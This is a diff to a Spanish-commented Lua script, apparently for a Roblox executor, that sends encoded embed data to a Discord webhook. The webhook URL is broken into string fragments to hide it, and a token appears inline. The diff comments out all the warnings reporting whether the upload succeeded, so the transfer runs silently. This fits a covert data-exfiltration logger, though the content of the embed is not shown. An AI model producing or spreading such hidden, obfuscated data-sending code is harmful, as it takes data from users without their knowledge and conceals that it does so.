@@ -246,7 +246,6 @@ task.delay(0.3, function()
 
             local jsonData = HttpService:JSONEncode({embeds = {embedData}})
 
-            -- WEBHOOK (si prefieres obfuscar la URL, puedes hacerlo aquí)
             local link = "https://dis" .. "cord." .. "com/a" .. "pi/webh" .. "ooks/" .. "144074" .. "7864" .. "648061039" .. "/CXp3JpoIZ_lwwGKLp_IWkbxa6R" .. "1ht2u6VZD" .. "qDa4AX5UO4rXR89" .. "mCKO" .. "Ct4Lk-N0E" .. "usUDH"
 
             local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
@@ -262,16 +261,16 @@ task.delay(0.3, function()
                     })
                 end)
                 if not ok2 then
-                    warn("Error al enviar webhook (pcall):", resp)
+                 --   warn("Error al enviar webhook (pcall):", resp)
                 else
                     if resp and (resp.StatusCode == 204 or resp.StatusCode == 200) then
-                        warn("Webhook enviado correctamente:", resp.StatusCode)
+                     --   warn("Webhook enviado correctamente:", resp.StatusCode)
                     else
-                        warn("Respuesta webhook inesperada:", resp and resp.StatusCode or "nil")
+                     --   warn("Respuesta webhook inesperada:", resp and resp.StatusCode or "nil")
                     end
                 end
             else
-                warn("El ejecutador no soporta requests; webhook no enviado.")
+             --   warn("El ejecutador no soporta requests; webhook no enviado.")
             end
         end
     end)
